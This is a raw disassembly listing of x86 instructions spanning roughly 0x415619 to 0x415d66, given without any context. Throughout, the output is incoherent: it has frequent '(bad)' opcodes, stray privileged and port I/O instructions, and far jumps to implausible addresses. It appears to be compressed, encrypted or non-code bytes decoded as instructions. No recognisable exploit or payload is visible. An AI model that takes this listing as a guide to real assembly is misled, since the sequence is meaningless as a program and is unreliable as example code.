  415619:	xor    al,0x29
  41561b:	mov    edx,0x1298acea
  415620:	add    BYTE PTR [ecx+0x37],dh
  415623:	cld    
  415624:	inc    ebp
  415625:	pusha  
  415626:	fisttp QWORD PTR [ecx+eiz*8-0x6fd99369]
  41562d:	in     al,0xaf
  41562f:	jmp    0x507685f6
  415634:	ud0    ebp,DWORD PTR [ebp+edi*4+0x6f]
  415639:	and    edx,DWORD PTR [ebx]
  41563b:	xchg   edx,eax
  41563c:	imul   ebp,DWORD PTR ss:[eax-0x126e9cf8],0xc0667758
  415647:	add    ch,BYTE PTR [eax+0x68]
  41564a:	sahf   
  41564b:	push   esi
  41564c:	ss inc ecx
  41564e:	push   0xffffffe9
  415650:	mov    dh,0x24
  415652:	in     al,0x9
  415654:	sbb    al,0x48
  415656:	loopne 0x415610
  415658:	sub    bh,ah
  41565a:	aad    0x92
  41565c:	aaa    
  41565d:	and    ebx,DWORD PTR [ebx+0x2e]
  415660:	pop    esp
  415661:	xchg   BYTE PTR [ebx+eiz*1-0x67],bl
  415665:	scas   eax,DWORD PTR es:[edi]
  415666:	sbb    al,0x4a
  415668:	gs mov ?,ebx
  41566b:	test   BYTE PTR [ecx+0x2d],cl
  41566e:	mov    dl,0x16
  415670:	mov    edx,0x9efeca4a
  415675:	push   ss
  415676:	push   0xffffff9e
  415678:	test   eax,0x45f1cd32
  41567d:	(bad)  
  41567e:	repnz sub eax,0x8f6703cd
  415684:	(bad)  
  415685:	jmp    0x415647
  415687:	fwait
  415688:	les    ebp,FWORD PTR [eax+0x1d]
  41568b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41568c:	xchg   esi,eax
  41568d:	(bad)  
  41568e:	popa   
  41568f:	addr16 popa 
  415691:	mov    al,0x7e
  415693:	jb     0x41567c
  415695:	pop    ebx
  415696:	int    0xe3
  415698:	sub    al,0x4
  41569a:	mov    BYTE PTR [ebp+0x5a],bl
  41569d:	mov    ch,0x62
  41569f:	mov    ecx,0x13d79d99
  4156a4:	or     ecx,0xd50c4862
  4156aa:	js     0x4156a5
  4156ac:	mov    ecx,0x2508127f
  4156b1:	xchg   DWORD PTR [edx],edx
  4156b3:	or     ch,BYTE PTR [esi+ecx*1-0x8]
  4156b7:	mov    ds:0xa4bcba47,al
  4156bc:	push   edi
  4156bd:	retf   0x31b5
  4156c0:	add    al,0x3
  4156c2:	inc    ebp
  4156c3:	imul   edi,DWORD PTR [edi],0x67
  4156c6:	cmp    BYTE PTR [eax+0x618f790f],dl
  4156cc:	les    ebx,FWORD PTR [eax-0x76a057d5]
  4156d2:	mov    dl,0x6f
  4156d4:	stc    
  4156d5:	dec    ecx
  4156d6:	sbb    DWORD PTR [edx],ebx
  4156d8:	mov    dl,0x8e
  4156da:	ret    
  4156db:	imul   edi,DWORD PTR [ebx-0x1fe4479],0xeaee029c
  4156e5:	jnp    0x415717
  4156e7:	pop    ebp
  4156e8:	pop    ecx
  4156e9:	mov    ah,0xbf
  4156eb:	pop    ds
  4156ec:	jo     0x41572e
  4156ee:	and    esp,esi
  4156f0:	mov    al,ds:0x9106e1d9
  4156f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f6:	mov    al,ds:0xcb903338
  4156fb:	mov    ch,0xa9
  4156fd:	add    ebp,DWORD PTR [esi+0x12]
  415700:	outs   dx,BYTE PTR ds:[esi]
  415701:	leave  
  415702:	(bad)  
  415703:	popf   
  415704:	es stos BYTE PTR es:[edi],al
  415706:	fcomp  DWORD PTR [edi+0xe]
  415709:	rcr    BYTE PTR [ecx+0x63cd0a4b],1
  41570f:	lahf   
  415710:	fld    QWORD PTR [ebx-0x51585c8f]
  415716:	mov    ds:0xa72c03c3,eax
  41571b:	(bad)  
  41571d:	xchg   ebx,eax
  41571e:	pop    ecx
  41571f:	fisub  WORD PTR [ebx-0x19a0c665]
  415725:	test   al,0x42
  415727:	ret    
  415728:	mov    dh,0x23
  41572a:	out    0x4b,al
  41572c:	bound  ecx,QWORD PTR [ebx-0x62]
  41572f:	or     DWORD PTR [esi-0x68],edi
  415732:	(bad)  
  415733:	in     eax,0x35
  415735:	xchg   eax,ebp
  415737:	test   al,0x15
  415739:	jl     0x41573e
  41573b:	mov    esi,0xab076400
  415740:	mov    al,0x60
  415742:	add    al,0x60
  415744:	in     al,dx
  415745:	int    0x2b
  415747:	xchg   edx,eax
  415748:	inc    edx
  415749:	mov    ds:0x73c8fcd0,eax
  41574e:	loope  0x41579e
  415750:	xchg   ecx,eax
  415751:	ds aad 0x80
  415754:	ror    BYTE PTR [ebx-0x3c],0xf4
  415758:	into   
  415759:	jg     0x415736
  41575b:	push   ecx
  41575c:	mov    dh,0x76
  41575e:	jp     0x41579c
  415760:	stos   BYTE PTR es:[edi],al
  415761:	data16 mov bh,0x2f
  415764:	stos   BYTE PTR es:[edi],al
  415765:	cwde   
  415766:	push   ss
  415767:	push   ebx
  415768:	mov    dl,0x11
  41576a:	dec    esp
  41576b:	jae    0x41572b
  41576d:	ret    
  41576e:	sbb    edi,DWORD PTR [ebx+edi*4]
  415771:	fnstsw WORD PTR [ecx-0x37]
  415774:	int3   
  415775:	sub    eax,0x934cc094
  41577a:	popf   
  41577b:	jo     0x41572c
  41577d:	xchg   ecx,eax
  41577e:	sub    eax,0xb602819a
  415783:	les    edi,FWORD PTR [ebp-0x32]
  415786:	sub    BYTE PTR [esi-0x3],cl
  415789:	test   al,0x1a
  41578b:	pop    ds
  41578c:	pop    ds
  41578d:	ror    edi,0xc7
  415790:	sti    
  415791:	pop    edi
  415792:	ins    BYTE PTR es:[edi],dx
  415793:	leave  
  415794:	retf   
  415795:	jg     0x4157de
  415797:	dec    edi
  415798:	into   
  415799:	das    
  41579a:	scas   al,BYTE PTR es:[edi]
  41579b:	pop    ss
  41579c:	jb     0x4157b2
  41579e:	jnp    0x4157cb
  4157a0:	jle    0x4157fa
  4157a2:	add    bl,BYTE PTR [ecx+0x67]
  4157a5:	mov    al,ds:0xe3dd9223
  4157aa:	fbld   TBYTE PTR [ebx]
  4157ac:	loope  0x41575f
  4157ae:	stos   BYTE PTR es:[edi],al
  4157af:	push   esi
  4157b0:	push   esp
  4157b1:	mov    cl,ah
  4157b3:	or     eax,0x81969a5
  4157b8:	std    
  4157b9:	cmp    al,0x3c
  4157bb:	imul   ebp,esi,0x2cbc7861
  4157c1:	sbb    DWORD PTR [ebp-0x3c93045],ecx
  4157c7:	addr16 mov ebp,0xf75c356b
  4157cd:	ja     0x4157c6
  4157cf:	inc    esp
  4157d0:	or     dl,BYTE PTR [ebx+esi*2+0x51]
  4157d4:	jmp    0xc24a:0x840db100
  4157db:	lods   eax,DWORD PTR ds:[esi]
  4157dc:	sub    BYTE PTR [ecx],bh
  4157de:	jne    0x415810
  4157e0:	cmp    DWORD PTR [ebx+eax*1-0x5f7c2506],eax
  4157e7:	call   0x9475:0xd8426c27
  4157ee:	push   ds
  4157ef:	sbb    BYTE PTR [eax+edi*1+0xd],bh
  4157f3:	adc    eax,0xfb13be36
  4157f8:	push   cs
  4157f9:	sub    DWORD PTR [ebp-0x27],ebp
  4157fc:	lods   eax,DWORD PTR ds:[esi]
  4157fd:	or     eax,0x8f2618eb
  415802:	pop    edi
  415803:	jecxz  0x4157f7
  415805:	inc    eax
  415806:	(bad)  
  415807:	inc    ebp
  415808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415809:	outs   dx,BYTE PTR ds:[esi]
  41580a:	out    dx,al
  41580b:	addr16 into 
  41580d:	test   al,0xbf
  41580f:	or     al,0x84
  415811:	sbb    DWORD PTR [edx+ebp*8+0x3b3b6cf1],esi
  415818:	int3   
  415819:	pop    ebp
  41581a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41581b:	pop    edi
  41581c:	retf   0x7f0b
  41581f:	jnp    0x4157ee
  415821:	popf   
  415822:	add    eax,0xe3eae9a2
  415827:	xor    eax,0xe1e282e9
  41582c:	fistp  QWORD PTR [edx]
  41582e:	ss jmp 0x68d50946
  415834:	ja     0x41584d
  415836:	ss out dx,al
  415838:	xor    al,0x7f
  41583a:	cmp    BYTE PTR [esi+ebx*2],bl
  41583d:	daa    
  41583e:	sbb    eax,0xcc026791
  415843:	xchg   ebp,eax
  415844:	aaa    
  415845:	fstp   DWORD PTR [edx-0x64c58f3]
  41584b:	mov    gs,edi
  41584d:	push   cs
  41584e:	ja     0x4157d0
  415850:	icebp  
  415851:	jns    0x415822
  415853:	inc    edi
  415854:	retf   
  415855:	nop
  415856:	(bad)  
  415858:	pop    ebx
  415859:	mov    ah,0x78
  41585b:	loope  0x415848
  41585d:	and    al,0x19
  41585f:	(bad)  
  415860:	mov    DWORD PTR [ebx*4-0x6516e32],esi
  415867:	add    al,0x70
  415869:	sub    DWORD PTR [ebp+0x2a4eb0b5],eax
  41586f:	pop    ss
  415870:	jb     0x41588e
  415872:	mov    ds:0xc9761ca9,eax
  415877:	adc    eax,0x3133b81d
  41587c:	xor    eax,0xdeb5dcc8
  415881:	fs dec esp
  415883:	ss pop ds
  415885:	mov    ah,0x65
  415887:	xlat   BYTE PTR ds:[ebx]
  415888:	icebp  
  415889:	aam    0x9a
  41588b:	test   esi,eax
  41588d:	lods   eax,DWORD PTR ds:[esi]
  41588e:	test   BYTE PTR [esi],bl
  415890:	leave  
  415891:	jbe    0x415860
  415893:	pop    edi
  415894:	xchg   ebx,eax
  415895:	out    0x49,eax
  415897:	sbb    dh,BYTE PTR [edx]
  415899:	out    dx,eax
  41589a:	and    al,0xd4
  41589c:	push   cs
  41589d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41589e:	jbe    0x415856
  4158a0:	inc    ebp
  4158a1:	push   es
  4158a2:	cmp    DWORD PTR [ebx+ebx*1+0x72],esp
  4158a6:	test   DWORD PTR [esi+ebp*8+0x57],esi
  4158aa:	xchg   edi,eax
  4158ab:	and    eax,ebp
  4158ad:	cli    
  4158ae:	cs pop edx
  4158b0:	pop    es
  4158b1:	jb     0x415859
  4158b3:	iret   
  4158b4:	(bad)  
  4158b5:	int    0x31
  4158b7:	xor    bh,al
  4158b9:	adc    eax,0xd2c20b25
  4158be:	pop    edx
  4158bf:	int    0x84
  4158c1:	xchg   esp,eax
  4158c2:	imul   eax,ebp,0x38
  4158c5:	push   ds
  4158c6:	or     DWORD PTR [ebx],ecx
  4158c8:	adc    BYTE PTR [edi-0x6e],0x19
  4158cc:	pop    ecx
  4158cd:	or     al,0xa0
  4158cf:	aad    0x52
  4158d1:	dec    ebx
  4158d2:	cmp    ah,BYTE PTR [ebp-0x1d6840fc]
  4158d8:	xchg   edi,eax
  4158d9:	adc    eax,0x5e7c01b7
  4158de:	fbld   TBYTE PTR ds:0xeb2d2fd4
  4158e4:	daa    
  4158e5:	bound  esp,QWORD PTR [edi+0x19e38a60]
  4158eb:	inc    ebx
  4158ec:	mov    ch,0x6d
  4158ee:	aaa    
  4158ef:	clc    
  4158f0:	in     eax,0xb6
  4158f2:	push   ecx
  4158f3:	push   ecx
  4158f4:	dec    edx
  4158f5:	push   ss
  4158f6:	aad    0xa9
  4158f8:	(bad)  
  4158fa:	fstp   DWORD PTR [edx]
  4158fc:	aaa    
  4158fd:	adc    ah,ch
  4158ff:	cmp    ecx,DWORD PTR [edx+0x3463eb72]
  415905:	aaa    
  415906:	jb     0x415979
  415908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415909:	add    eax,0x79008581
  41590e:	pop    ebx
  41590f:	sub    ebp,ebp
  415911:	into   
  415912:	inc    esi
  415913:	dec    edx
  415914:	or     al,0x6
  415916:	pop    esp
  415917:	lods   eax,DWORD PTR ds:[esi]
  415918:	xchg   edi,eax
  415919:	mov    dh,bl
  41591b:	aam    0xa0
  41591d:	lods   al,BYTE PTR ds:[esi]
  41591e:	mov    eax,0x6dee993e
  415923:	and    esi,DWORD PTR [edx]
  415925:	ss aam 0x8
  415928:	or     al,0xa9
  41592a:	imul   ebp,esi,0xffffffa4
  41592d:	inc    ebp
  41592e:	xchg   BYTE PTR [esi+0x48],bh
  415931:	cwde   
  415932:	push   0x66
  415934:	dec    edx
  415935:	iret   
  415936:	dec    esp
  415937:	mov    eax,ds:0x203a1233
  41593c:	dec    edx
  41593d:	(bad)  
  41593e:	test   BYTE PTR ds:0x8c9a471f,bh
  415944:	xchg   edx,eax
  415945:	add    eax,0x4299eca1
  41594a:	in     al,0x27
  41594c:	jp     0x41592b
  41594e:	fstp   TBYTE PTR [edx-0x70b5aa77]
  415954:	fcmovu st,st(5)
  415956:	pop    ds
  415957:	(bad)  
  415958:	cld    
  415959:	sub    BYTE PTR [edi+0x53],dh
  41595c:	and    DWORD PTR [eax-0x73],0xffffffc9
  415960:	cli    
  415961:	inc    ecx
  415962:	test   BYTE PTR [edi+0x12],dh
  415965:	inc    ecx
  415966:	fs and al,0x13
  415969:	sahf   
  41596a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41596b:	sbb    al,0x20
  41596d:	out    dx,al
  41596e:	xor    BYTE PTR [esi+0x3e9ecb32],cl
  415974:	sbb    bh,dh
  415976:	mov    edi,0x6ee0de3a
  41597b:	adc    dl,0xa2
  41597e:	(bad)  [edx+esi*4-0x5a6557b3]
  415985:	idiv   DWORD PTR [edi+edx*4]
  415988:	xchg   esp,eax
  415989:	js     0x4159d3
  41598b:	scas   eax,DWORD PTR es:[edi]
  41598c:	and    al,0x95
  41598e:	std    
  41598f:	adc    DWORD PTR [edi],edx
  415991:	(bad)  
  415992:	ins    BYTE PTR es:[edi],dx
  415993:	xchg   DWORD PTR [ebx],eax
  415995:	in     al,0x5d
  415997:	fstp   DWORD PTR [edx]
  415999:	jbe    0x4159c5
  41599b:	or     DWORD PTR [ebp+0xb04acd7],eax
  4159a1:	iret   
  4159a2:	pop    ebp
  4159a3:	mov    ds:0xce677d9f,eax
  4159a8:	(bad)  
  4159a9:	in     eax,0xe0
  4159ab:	popf   
  4159ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ad:	push   edi
  4159ae:	(bad)  
  4159af:	pop    ebp
  4159b0:	stos   DWORD PTR es:[edi],eax
  4159b1:	mov    al,ds:0xf13155d
  4159b6:	adc    BYTE PTR [eax-0x394f7159],bl
  4159bc:	fcomip st,st(4)
  4159be:	and    eax,0xc50bc6d0
  4159c3:	sti    
  4159c4:	(bad)  
  4159c5:	repnz test al,0xe
  4159c8:	or     DWORD PTR [edi+edi*8],0x37
  4159cc:	add    edx,DWORD PTR [eax+edx*2-0x5d]
  4159d0:	jno    0x4159ed
  4159d2:	mov    edi,0x261f52f5
  4159d7:	cs lock sub eax,0x5514005a
  4159de:	es xchg edi,eax
  4159e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159e2:	jo     0x415984
  4159e4:	ins    BYTE PTR es:[edi],dx
  4159e5:	shl    cl,0x15
  4159e8:	sub    cl,BYTE PTR [ebx-0x47d04d6]
  4159ee:	adc    bl,cl
  4159f0:	xchg   DWORD PTR [esp+ebx*4+0x39],ecx
  4159f4:	ret    
  4159f5:	call   0x8b5810dc
  4159fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159fc:	push   0xe232e83d
  415a01:	and    dl,cl
  415a03:	neg    DWORD PTR [ecx+0x3e533499]
  415a09:	xor    bh,BYTE PTR [ecx]
  415a0b:	and    al,0xce
  415a0d:	aas    
  415a0e:	aaa    
  415a0f:	push   ds
  415a10:	add    al,0xbc
  415a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a13:	pop    esi
  415a14:	mov    dl,0xaf
  415a16:	jb     0x4159b7
  415a18:	mov    esp,0xf724e8ff
  415a1d:	ds retf 0xaf2c
  415a21:	ins    DWORD PTR es:[edi],dx
  415a22:	xor    DWORD PTR [edi+0x77],esi
  415a25:	lods   eax,DWORD PTR ds:[esi]
  415a26:	test   BYTE PTR [esp+edx*2],ah
  415a29:	pop    ds
  415a2a:	pop    edx
  415a2b:	icebp  
  415a2c:	mov    ebx,gs
  415a2e:	dec    ebx
  415a2f:	sbb    ecx,esi
  415a31:	jle    0x415a94
  415a33:	sbb    al,0x17
  415a35:	daa    
  415a36:	or     al,0xdc
  415a38:	idiv   ecx
  415a3a:	or     ch,dh
  415a3c:	gs adc eax,0x88f40b60
  415a42:	sti    
  415a43:	(bad)  
  415a44:	fdiv   QWORD PTR [edx]
  415a46:	add    eax,0x85a1bcbd
  415a4b:	out    dx,eax
  415a4c:	hlt    
  415a4d:	push   esi
  415a4e:	out    0xc8,al
  415a50:	ins    DWORD PTR es:[edi],dx
  415a51:	js     0x415a52
  415a53:	cs enter 0x5ccf,0xe2
  415a58:	(bad)  
  415a59:	and    cl,BYTE PTR [ebp-0x40]
  415a5c:	outs   dx,BYTE PTR ds:[esi]
  415a5d:	push   edi
  415a5e:	xlat   BYTE PTR ds:[ebx]
  415a5f:	pushf  
  415a60:	push   esi
  415a61:	outs   dx,DWORD PTR ds:[esi]
  415a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a63:	adc    bl,cl
  415a65:	daa    
  415a66:	ins    BYTE PTR es:[edi],dx
  415a67:	jmp    eax
  415a69:	pop    esp
  415a6a:	out    dx,al
  415a6b:	clc    
  415a6c:	out    0x4e,eax
  415a6e:	mov    bh,0x5a
  415a70:	adc    BYTE PTR [eax],ch
  415a72:	push   esi
  415a73:	aam    0xab
  415a75:	(bad)  
  415a76:	cmc    
  415a77:	mov    ch,BYTE PTR [ebp+0x1b]
  415a7a:	repnz or cl,al
  415a7d:	push   es
  415a7e:	push   es
  415a7f:	nop
  415a80:	mov    ds,WORD PTR [edx+0x18]
  415a83:	pushf  
  415a84:	dec    esp
  415a85:	lea    edi,[eax+eax*4]
  415a88:	jb     0x415a40
  415a8a:	pop    edi
  415a8b:	mov    al,ch
  415a8d:	inc    eax
  415a8e:	adc    DWORD PTR [edi+0x57],esi
  415a91:	dec    esi
  415a92:	in     al,0x2f
  415a94:	xchg   esp,eax
  415a95:	mov    edi,0x7eeb81d3
  415a9a:	push   0x6c
  415a9c:	dec    edi
  415a9d:	jo     0x415a5d
  415a9f:	mov    ds:0x6847bf08,al
  415aa4:	into   
  415aa5:	mov    eax,0xb1dcaa6b
  415aaa:	stos   BYTE PTR es:[edi],al
  415aab:	dec    eax
  415aac:	(bad)  
  415aad:	in     al,0x55
  415aaf:	(bad)  
  415ab0:	pusha  
  415ab1:	in     eax,0xe9
  415ab3:	vmread DWORD PTR [ebx],eax
  415ab6:	jo     0x415adc
  415ab8:	add    ebx,0xffffffd6
  415abb:	scas   eax,DWORD PTR es:[edi]
  415abc:	lds    edx,FWORD PTR [esp+ebp*8]
  415abf:	loope  0x415b03
  415ac1:	aaa    
  415ac2:	or     BYTE PTR [ebx-0x252a64d6],dh
  415ac8:	out    dx,eax
  415ac9:	addr16 (bad) 
  415acb:	xchg   edx,eax
  415acc:	pop    ss
  415acd:	jb     0x415b4e
  415acf:	and    ch,cl
  415ad1:	jns    0x415af3
  415ad3:	es jge 0x415a79
  415ad6:	mov    gs,WORD PTR [ecx+0x56]
  415ad9:	cld    
  415ada:	xchg   esi,eax
  415adb:	enter  0xa5c8,0x26
  415adf:	push   edx
  415ae0:	sub    edx,esp
  415ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae3:	repz in eax,dx
  415ae5:	pop    ebx
  415ae6:	pop    edi
  415ae7:	ins    DWORD PTR es:[edi],dx
  415ae8:	fsubr  QWORD PTR ds:0x14c17505
  415aee:	(bad)  [esi]
  415af0:	and    ch,dl
  415af2:	and    al,0x62
  415af4:	icebp  
  415af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af6:	mov    esi,0x81a5208a
  415afb:	aam    0x3e
  415afd:	test   al,0xfe
  415aff:	lock or eax,0x74384e4f
  415b05:	pop    edi
  415b06:	(bad)  
  415b08:	jecxz  0x415a98
  415b0a:	xchg   DWORD PTR [eax+0x68],esi
  415b0d:	rcr    BYTE PTR [edx],cl
  415b0f:	xchg   ebp,eax
  415b10:	and    ebp,DWORD PTR [edi+ebp*1-0x1105ba98]
  415b17:	and    dh,dh
  415b19:	ds je  0x415b94
  415b1c:	fwait
  415b1d:	mov    dl,0x79
  415b1f:	or     BYTE PTR [esi+edi*8],bl
  415b22:	repnz pop ebp
  415b24:	fwait
  415b25:	or     al,0x77
  415b27:	ins    BYTE PTR es:[edi],dx
  415b28:	dec    edx
  415b29:	jbe    0x415af6
  415b2b:	and    al,0xeb
  415b2d:	adc    al,0xdd
  415b2f:	or     edi,DWORD PTR [esi-0x4e045094]
  415b35:	fxsave [ebx+0x53]
  415b39:	aam    0xb3
  415b3b:	sbb    ah,BYTE PTR [edi+0x16]
  415b3e:	dec    esi
  415b3f:	enter  0xb122,0x15
  415b43:	iret   
  415b44:	mov    bh,0xdf
  415b46:	arpl   WORD PTR [esi],di
  415b48:	cmc    
  415b49:	mov    ch,0xe4
  415b4b:	es fwait
  415b4d:	adc    DWORD PTR [ebx-0x1d],0xa4659752
  415b54:	lds    ecx,FWORD PTR [ebp-0x1e]
  415b57:	imul   edi,DWORD PTR [ebx+0x11],0xffffff9f
  415b5b:	repnz pop eax
  415b5d:	and    BYTE PTR [esi+0x6897f963],dl
  415b63:	jo     0x415ae6
  415b65:	mov    edi,0x2138ef73
  415b6a:	mov    edi,0xd4627ef3
  415b6f:	xor    BYTE PTR [edi+0x3e],cl
  415b72:	xor    BYTE PTR [ebp*2-0x72189e2b],0x2
  415b7a:	cdq    
  415b7b:	xchg   ecx,eax
  415b7c:	not    DWORD PTR [ecx-0x22916e63]
  415b82:	(bad)  
  415b84:	xchg   BYTE PTR [edi+0x5f],bl
  415b87:	push   esp
  415b88:	(bad)  
  415b8a:	fcomp  DWORD PTR [eax-0xe79f212]
  415b90:	xchg   edx,eax
  415b91:	xchg   DWORD PTR [edx-0x2a],edi
  415b94:	adc    ah,cl
  415b96:	inc    esi
  415b97:	push   esp
  415b98:	call   0xd65f:0x2d52aee
  415b9f:	jb     0x415b25
  415ba1:	das    
  415ba2:	jl     0x415ba3
  415ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba5:	or     al,0x14
  415ba7:	imul   edx,DWORD PTR [eax],0xf4eb4575
  415bad:	hlt    
  415bae:	push   ss
  415baf:	cmp    ah,BYTE PTR [edi+0x3e16cef5]
  415bb5:	out    0xbb,al
  415bb7:	mov    bl,0x5f
  415bb9:	sbb    DWORD PTR [ebp+0x4a],ecx
  415bbc:	jae    0x415c27
  415bbe:	ins    DWORD PTR es:[edi],dx
  415bbf:	(bad)  
  415bc0:	ja     0x415bea
  415bc2:	mov    esi,ds
  415bc4:	out    dx,eax
  415bc5:	nop
  415bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bc7:	lahf   
  415bc8:	loop   0x415c05
  415bca:	jl     0x415bd0
  415bcc:	pop    ss
  415bcd:	xor    ah,BYTE PTR [esi+eax*1]
  415bd0:	fs xchg cl,ah
  415bd3:	xchg   BYTE PTR [edx-0x3f],bl
  415bd6:	push   ds
  415bd7:	(bad)  
  415bd8:	retf   
  415bd9:	lods   al,BYTE PTR ds:[esi]
  415bda:	popf   
  415bdb:	mov    bh,0x4a
  415bdd:	or     eax,0x6477ae37
  415be2:	mov    DWORD PTR [eax+0x1e],eax
  415be5:	ins    DWORD PTR es:[edi],dx
  415be6:	push   esp
  415be7:	hlt    
  415be8:	mov    BYTE PTR [ecx+0x2af264a9],bl
  415bee:	sbb    DWORD PTR [eax],0xffffff98
  415bf1:	sbb    eax,DWORD PTR [ebp-0x75]
  415bf4:	xchg   esi,eax
  415bf5:	pop    eax
  415bf6:	and    eax,0xbcce44ce
  415bfb:	cwde   
  415bfc:	gs dec esi
  415bfe:	jae    0x415c73
  415c00:	mov    BYTE PTR [ecx+0x6d9e467f],ch
  415c06:	xchg   ecx,eax
  415c07:	cmp    esp,DWORD PTR [esp+esi*8-0x1e]
  415c0b:	lock cli 
  415c0d:	sub    al,BYTE PTR [edi]
  415c0f:	ds xchg ebx,eax
  415c11:	lds    edi,FWORD PTR [edi]
  415c13:	jne    0x415be7
  415c15:	in     al,dx
  415c16:	leave  
  415c17:	xchg   esi,eax
  415c18:	inc    ecx
  415c19:	aad    0x4a
  415c1b:	aad    0xe6
  415c1d:	cmp    al,0x87
  415c1f:	or     DWORD PTR [ecx+0x40b3c513],ebp
  415c25:	in     al,dx
  415c26:	imul   edi,ebx,0xffffffb1
  415c29:	jl     0x415c2a
  415c2b:	pop    ebp
  415c2c:	cli    
  415c2d:	imul   ch
  415c2f:	or     BYTE PTR [edx-0x498a50c1],0xd5
  415c36:	adc    eax,0x2a108214
  415c3b:	fcomi  st,st(3)
  415c3d:	int3   
  415c3e:	jmp    0xa7842ff9
  415c43:	push   ebx
  415c44:	shl    bl,0x8e
  415c47:	lea    ecx,[edx+ebx*2]
  415c4a:	lahf   
  415c4b:	jo     0x415bd6
  415c4d:	adc    BYTE PTR [ebp-0x10],cl
  415c50:	push   ds
  415c51:	mov    esp,0x12b6c335
  415c56:	jmp    0x8ce6:0x4e6e5e76
  415c5d:	das    
  415c5e:	lods   eax,DWORD PTR ds:[esi]
  415c5f:	xor    DWORD PTR [edx-0x358be016],ebp
  415c65:	mov    ds:0xc1720fb5,eax
  415c6a:	in     eax,0x6e
  415c6c:	in     eax,0xb2
  415c6e:	and    esp,DWORD PTR [edx]
  415c70:	cld    
  415c71:	popf   
  415c72:	sub    dh,al
  415c74:	ret    0xc45d
  415c77:	addr16 iret 
  415c79:	loope  0x415c8a
  415c7b:	bound  ebx,QWORD PTR ds:0xb9929eac
  415c81:	das    
  415c82:	fldenv [ecx+0x4]
  415c85:	mov    bl,0x39
  415c87:	inc    edi
  415c88:	shl    BYTE PTR [edx-0x57],cl
  415c8b:	push   ebx
  415c8c:	(bad)  
  415c8e:	es test al,0x8b
  415c91:	nop
  415c92:	and    bl,BYTE PTR [esi]
  415c94:	mov    DWORD PTR [edi-0x6f],eax
  415c97:	jo     0x415cd5
  415c99:	ror    DWORD PTR [ecx+0x1354fdd1],1
  415c9f:	mov    edx,0xca0c2ba6
  415ca4:	mov    BYTE PTR [ebx-0x12],cl
  415ca7:	stos   BYTE PTR es:[edi],al
  415ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca9:	jmp    0xc67be6ef
  415cae:	push   edx
  415caf:	in     al,dx
  415cb0:	cwde   
  415cb1:	and    DWORD PTR [ebp-0x3f],esp
  415cb4:	out    dx,al
  415cb5:	jmp    ebx
  415cb7:	push   edx
  415cb8:	lds    edx,FWORD PTR [esi-0x61ac93fb]
  415cbe:	rcl    ecx,0xaa
  415cc1:	add    al,0xe1
  415cc3:	sub    eax,0x3c317b68
  415cc8:	xor    ch,ch
  415cca:	cs enter 0x38,0x91
  415ccf:	cwde   
  415cd0:	ret    
  415cd1:	xchg   ecx,eax
  415cd2:	fcmovb st,st(1)
  415cd4:	loopne 0x415c7a
  415cd6:	popa   
  415cd7:	lods   eax,DWORD PTR ds:[esi]
  415cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cd9:	push   edx
  415cda:	xor    DWORD PTR [ebx+0x1f],ecx
  415cdd:	aaa    
  415cde:	(bad)  
  415cdf:	lea    ecx,[edx-0x5d]
  415ce2:	adc    ah,ah
  415ce4:	adc    eax,ebp
  415ce6:	dec    ecx
  415ce7:	in     eax,0x1b
  415ce9:	aas    
  415cea:	jno    0x415c8b
  415cec:	adc    bl,bh
  415cee:	xor    dh,BYTE PTR [ecx+0x50fb6957]
  415cf4:	int3   
  415cf5:	adc    al,cl
  415cf7:	add    DWORD PTR [ecx+0x11c136be],edx
  415cfd:	ret    
  415cfe:	dec    edi
  415cff:	sti    
  415d00:	pop    ds
  415d01:	pop    esi
  415d02:	and    BYTE PTR [ebx+esi*4+0x50],dh
  415d06:	sub    al,0x66
  415d08:	icebp  
  415d09:	mov    esp,0xcea7e4cb
  415d0e:	js     0x415cef
  415d10:	sbb    bl,BYTE PTR [ecx+0x43]
  415d13:	ja     0x415c98
  415d15:	push   eax
  415d16:	loopne 0x415d41
  415d18:	jl     0x415d79
  415d1a:	data16 jge 0x415cde
  415d1d:	jp     0x415d0b
  415d1f:	dec    edi
  415d20:	add    ch,BYTE PTR [esi+0x7f]
  415d23:	jb     0x415ce2
  415d25:	or     dh,BYTE PTR [ecx+0x76]
  415d28:	adc    DWORD PTR [ecx-0x56],ebp
  415d2b:	dec    edx
  415d2c:	dec    edx
  415d2d:	add    eax,DWORD PTR [edx]
  415d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d30:	pop    esp
  415d31:	in     al,0x98
  415d33:	out    dx,eax
  415d34:	push   cs
  415d35:	adc    al,0xce
  415d37:	xchg   edi,eax
  415d38:	in     al,0x5e
  415d3a:	push   ebx
  415d3b:	xor    bl,BYTE PTR [esi+edi*8]
  415d3e:	rcl    BYTE PTR ds:0x63c3841f,1
  415d44:	push   eax
  415d45:	xchg   ebx,eax
  415d46:	or     al,BYTE PTR [ecx]
  415d48:	and    edi,DWORD PTR [esi-0x55eac15]
  415d4e:	push   ss
  415d4f:	cld    
  415d50:	fisubr DWORD PTR [ecx-0x1d]
  415d53:	mov    cl,0x23
  415d55:	mov    dh,0x7e
  415d57:	fcom   st(2)
  415d59:	xchg   esp,eax
  415d5a:	mov    ecx,0x33c7eb61
  415d5f:	fistp  DWORD PTR [ecx-0x1c]
  415d62:	in     al,0x8a
  415d64:	mov    cl,0x97
  415d66:	nop
